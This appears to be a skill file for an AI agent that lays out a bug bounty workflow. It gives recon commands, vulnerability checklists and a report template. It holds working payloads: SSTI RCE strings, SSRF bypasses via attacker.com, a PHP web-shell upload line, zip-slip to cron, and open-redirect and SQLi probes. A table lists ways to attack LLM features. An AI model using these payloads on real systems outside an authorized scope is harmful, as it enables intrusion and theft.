name: bug-bounty
description: Complete bug bounty workflow — recon, vulnerability hunting (IDOR, SSRF, XSS, auth bypass, SQLi, XXE, SSTI, LLM/AI security), bug chaining, and reporting. 漏洞赏金、安全测试、渗透测试、漏洞挖掘
trigger:
  - 漏洞赏金
  - 安全测试
  - 渗透测试
  - 漏洞挖掘
  - 信息收集
  - 子域名枚举
  - XSS测试
  - SQL注入
  - SSRF
  - 安全审计
  - 漏洞报告
  - bug bounty
  - recon
  - pentest
  - vulnerability hunting
  - IDOR
  - SSRF
  - XSS
  - SQLi

---

# THE ONLY QUESTION THAT MATTERS

**"Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions -- and does it cause real harm (stolen money, leaked PII, account takeover, code execution)?"**

If the answer is NO -- STOP. Do not write. Do not explore further. Move on.

---

# Theoretical Bug = Wasted Time. Kill These Immediately:

| Pattern | Kill Reason |
| "Could theoretically allow..." | Not exploitable = not a bug |
| "An attacker with X, Y, Z conditions could..." | Too many preconditions |
| "Wrong implementation but no practical impact" | Wrong but harmless = not a bug |
| Dead code with a bug in it | Not reachable = not a bug |
| Source maps without secrets | No impact |
| SSRF with DNS-only callback | Need data exfil or internal access |
| Open redirect alone | Need ATO or OAuth chain |
| "Could be used in a chain if..." | Build the chain first, THEN report |

You must demonstrate actual harm. "Could" is not a bug. Prove it works or drop it.

---

# CRITICAL RULES

1. **READ FULL SCOPE FIRST** -- verify every asset/domain is owned by the target org
2. **NO THEORETICAL BUGS** -- "Can an attacker steal funds, leak PII, takeover account, or execute code RIGHT NOW?" If no, STOP.
3. **KILL WEAK FINDINGS FAST** -- run the 7-Question Gate BEFORE writing any report
4. **Validate before writing** -- check CHANGELOG, design docs, deployment scripts FIRST
5. **One bug class at a time** -- go deep, don't spray
6. **Verify data isn't already public** -- check web UI in incognito before reporting API "leaks"
7. **5-MINUTE RULE** -- if a target shows nothing after 5 min probing (all 401/403/404), MOVE ON
8. **IMPACT-FIRST HUNTING** -- ask "what's the worst thing if auth was broken?" If nothing valuable, skip target
9. **CREDENTIAL LEAKS need exploitation proof** -- finding keys isn't enough, must PROVE what they access
10. **STOP SHALLOW RECON SPIRALS** -- don't probe 403s, don't grep for analytics keys, don't check staging domains that lead nowhere
11. **BUSINESS IMPACT over vuln class** -- severity depends on CONTEXT, not just vuln type
12. **UNDERSTAND THE TARGET DEEPLY** -- before hunting, learn the app like a real user
13. **HUNT LESS-SATURATED VULN CLASSES** -- XSS/SSRF/XXE have the most competition. Expand into: cache poisoning, Android/mobile vulns, business logic, race conditions, OAuth/OIDC chains, CI/CD pipeline attacks
14. **ONE-HOUR RULE** -- stuck on one target for an hour with no progress? SWITCH CONTEXT

---

# A->B BUG SIGNAL METHOD (Cluster Hunting)

When you find bug A, systematically hunt for B and C nearby. This is one of the most powerful methodologies in bug bounty. Single bugs pay. Chains pay 3-10x more.

## Known A->B->C Chains

| Bug A (Signal) | Hunt for Bug B | Escalate to C |
| IDOR (read) | PUT/DELETE on same endpoint | Full account data manipulation |
| SSRF (any) | Cloud metadata 169.254.169.254 | IAM credential exfil -> RCE |
| XSS (stored) | Check if HttpOnly is set on session cookie | Session hijack -> ATO |
| Open redirect | OAuth redirect_uri accepts your domain | Auth code theft -> ATO |
| S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret -> OAuth chain |
| Rate limit bypass | OTP brute force | Account takeover |
| GraphQL introspection | Missing field-level auth | Mass PII exfil |
| Debug endpoint | Leaked environment variables | Cloud credential -> infrastructure access |
| CORS reflects origin | Test with credentials: include | Credentialed data theft |
| Host header injection | Password reset poisoning | ATO via reset link |

---

# QUICK RECON PIPELINE

```bash
# Step 1: Subdomains
subfinder -d TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only TARGET | anew /tmp/subs.txt

# Step 2: Resolve + live hosts
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect -o /tmp/live.txt

# Step 3: URL collection
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -silent | anew /tmp/urls.txt

# Step 4: Nuclei scan
nuclei -l /tmp/live.txt -severity critical,high,medium -silent -o /tmp/nuclei.txt
```

---

# VULNERABILITY HUNTING CHECKLISTS

## IDOR -- Insecure Direct Object Reference

### IDOR Variants (10 Ways to Test)

| Variant | What to Test |
| V1: Direct | Change object ID in URL path /api/users/123 -> /api/users/456 |
| V2: Body param | Change ID in POST/PUT JSON body {"user_id": 456} |
| V3: GraphQL node | { node(id: "base64(OtherType:123)") { ... } } |
| V4: Batch/bulk | /api/users?ids=1,2,3,4,5 -- request multiple IDs at once |
| V5: Nested | Change parent ID: /orgs/{org_id}/users/{user_id} |
| V6: File path | /files/download?path=../other-user/file.pdf |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try /api/v1/ same endpoint |
| V10: Header injection | X-User-ID: victim_id, X-Org-ID: victim_org |

---

## SSRF -- Server-Side Request Forgery

- Try cloud metadata: http://169.254.169.254/latest/meta-data/
- Try internal services: http://127.0.0.1:6379/ (Redis), :9200 (Elasticsearch), :27017 (MongoDB)
- Test all IP bypass techniques
- Test protocol bypass: file://, dict://, gopher://
- Look in: webhook URLs, import from URL, profile picture URL, PDF generators, XML parsers

### SSRF IP Bypass Table

| Bypass | Payload | Notes |
| Decimal IP | http://2130706433/ | 127.0.0.1 as single decimal |
| Hex IP | http://0x7f000001/ | Hex representation |
| Octal IP | http://0177.0.0.1/ | Octal 0177 = 127 |
| Short IP | http://127.1/ | Abbreviated notation |
| IPv6 | http://[::1]/ | Loopback in IPv6 |
| IPv6-mapped | http://[::ffff:127.0.0.1]/ | IPv4-mapped IPv6 |
| Redirect chain | http://attacker.com/302->http://169.254.169.254 | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
| URL encoding | http://127.0.0.1%2523@attacker.com | Parser confusion |

---

## XSS -- Cross-Site Scripting

### XSS Sinks (grep for these)

```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)
```

### XSS Chains (escalate from Medium to High/Critical)

- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass -> Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO

---

## SQL Injection

### Detection

```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
```

---

## SSTI -- Server-Side Template Injection

| Detection Payload | Template |
| {{7*7}} | Jinja2 / Twig / generic |
| ${7*7} | Freemarker / Pebble / Velocity |
| <%= 7*7 %> | ERB (Ruby) |
| #{7*7} | Mako / some Ruby |

### RCE Payloads

- **Jinja2**: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig**: `{{["id"]|filter("system")}}`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

---

## LLM / AI Features (OWASP ASI01-ASI10)

| ID | Vuln Class | What to Test |
| ASI01 | Prompt injection | Override system prompt via user input |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params (SSRF, RCE) |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts |
| ASI04 | Privilege escalation | Use AI to access admin-only tools |
| ASI05 | Indirect injection | Poison document/URL the AI processes |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation |
| ASI07 | Model DoS | Craft inputs that cause infinite loops |
| ASI08 | Insecure output | AI generates XSS/SQLi in output |
| ASI09 | Supply chain | Compromised plugins/tools the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys |

---

## File Upload Bypass Table

| Technique | Example |
| Double extension | file.php.jpg, file.php%00.jpg |
| Case variation | file.pHp, file.PHP5 |
| Alternative extensions | .phtml, .phar, .shtml, .inc |
| Content-Type spoof | image/jpeg header with PHP content |
| Magic bytes | GIF89a; <?php system($_GET['c']); ?> |
| .htaccess upload | AddType application/x-httpd-php .jpg |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Zip slip | ../../etc/cron.d/shell in filename inside archive |

---

## Open Redirect Bypass Table

| Bypass | Payload | Notes |
| Double URL encoding | %252F%252F | Decodes to // after double decode |
| Backslash | https://target.com\@evil.com | Some parsers normalize \ to / |
| Missing protocol | //evil.com | Protocol-relative |
| @-trick | https://target.com@evil.com | target.com becomes username |
| Protocol-relative | ///evil.com | Triple slash |
| Tab/newline injection | //evil%09.com | Whitespace in hostname |

---

# THE 7-QUESTION GATE (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO -> STOP.

**Q1:** Can I exploit this RIGHT NOW with a real PoC? Write the exact HTTP request. If you cannot produce a working request -> KILL IT.

**Q2:** Does it affect a REAL user who took NO unusual actions? No "the user would need to..." with 5 preconditions. Victim did nothing special.

**Q3:** Is the impact concrete (money, PII, ATO, RCE)? "Technically possible" is not impact. "I read victim's SSN" is impact.

**Q4:** Is this in scope per the program policy? Check the exact domain/endpoint against the program's scope page.

**Q5:** Did I check Hacktivity/changelog for duplicates? Search the program's disclosed reports and recent changelog entries.

**Q6:** Is this NOT on the "always rejected" list? If it's there and you can't chain it -> KILL IT.

**Q7:** Would a triager reading this say "yes, that's a real bug"? Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?

---

# ALWAYS REJECTED -- Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover (usually), autocomplete on password fields.

---

# REPORT TEMPLATE

## Title
[ vuln class ] in [ endpoint/feature ] leads to [ Impact ]

## Summary
[ 2-3 sentences: what it is, where it is, what attacker can do ]

## Steps To Reproduce
1. Log in as attacker (account A)
2. Send request: [ paste exact request ]
3. Observe: [ exact response showing the bug ]
4. Confirm: [ what the attacker gained ]

## Supporting Material
[ Screenshot / video of exploitation ]
[ Burp Suite request/response ]

## Impact
An attacker can [ specific action ] resulting in [ specific harm ].
[ Quantify if possible: "This affects all X users" or "Attacker can access Y data" ]

## Severity Assessment
CVSS 3.1 Score: X.X ( Severity label )
Attack Vector: Network | Complexity: Low | Privileges: None | User Interaction: None

---

# TOP HUNTING TIPS

1. **Hunt the feature, not the endpoint** -- Find all endpoints that serve a feature, then test the INTERACTION between them.
2. **Authorization inconsistency is your friend** -- If the app checks auth in 9 places but not the 10th, that's your bug.
3. **New == unreviewed** -- Features launched in the last 30 days have lowest security maturity.
4. **Think second-order** -- Second-order SSRF: URL saved in DB, fetched by cron job. Second-order XSS: stored clean, rendered unsafely in admin panel.
5. **Follow the money** -- Any feature touching payments, billing, credits, refunds is where developers make the most security shortcuts.
6. **The API the mobile app uses** -- Mobile apps often call older/different API versions. Same company, different attack surface, lower maturity.
7. **Diffs find bugs** -- Compare old API docs vs new. Compare mobile API vs web API. Compare what a free user can request vs what a paid user gets in response.

---

# LANGUAGE-SPECIFIC GREP PATTERNS

```bash
# JavaScript/TypeScript -- prototype pollution, postMessage, RCE sinks
grep -rn "__proto__|constructor\[" --include="*.js" --include="*.ts" | grep -v node_modules
grep -rn "postMessage|addEventListener.*message" --include="*.js" | grep -v node_modules
grep -rn "child_process|execSync|spawn(" --include="*.js" | grep -v node_modules

# Python -- pickle, yaml.load, eval, shell injection
grep -rn "pickle\.loads|yaml\.load|eval\(" --include="*.py" | grep -v test
grep -rn "subprocess|os\.system|os\.popen" --include="*.py" | grep -v test

# PHP -- type juggling, unserialize, LFI
grep -rn "unserialize|eval\(|preg_replace.*e" --include="*.php"
grep -rn "=\.=\.password|=\.=\.token|=\.=\.hash" --include="*.php"

# Go -- template.HTML, race conditions
grep -rn "template\.HTML|template\.JS|template\.URL" --include="*.go"

# Rust -- panic on network input, unsafe blocks
grep -rn "\.unwrap\(\)|\.expect\(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
```

---

# TOOLS REFERENCE

## Go Binaries
- subfinder: Passive subdomain enum
- httpx: Probe live hosts
- dnsx: DNS resolution
- nuclei: Template scanner
- katana: Crawl
- dalfox: XSS scanner
- ffuf: Fuzzer
- gf: Grep patterns (xss, sqli, ssrf, redirect)
- interactsh-client: OOB callbacks

## Install When Needed
```bash
arjun # Hidden parameter discovery
paramspider # URL parameter mining
kiterunner # API endpoint brute
trufflehog # Secret scanning
sqlmap # SQL injection
XSStrike # Advanced XSS scanner
```

---

# SEMGREP QUICK AUDIT

```bash
# Broad security audit
semgrep --config=p/security-audit ./
semgrep --config=p/owasp-top-ten ./

# Language-specific rulesets
semgrep --config=p/javascript ./src/
semgrep --config=p/python ./
semgrep --config=p/golang ./

# Targeted rules
semgrep --config=p/sql-injection ./
semgrep --config=p/jwt ./
```

---

# FFUF ADVANCED

```bash
# THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)
ffuf -w wordlist.txt -u https://target.com/FUZZ -ac

# Authenticated raw request file — IDOR testing
seq 1 10000 | ffuf --request req.txt -w - -ac

# Parameter discovery
ffuf -w ~/wordlists/burp-parameter-names.txt -u "https://target.com/api/endpoint?FUZZ=test" -ac -mc 200
```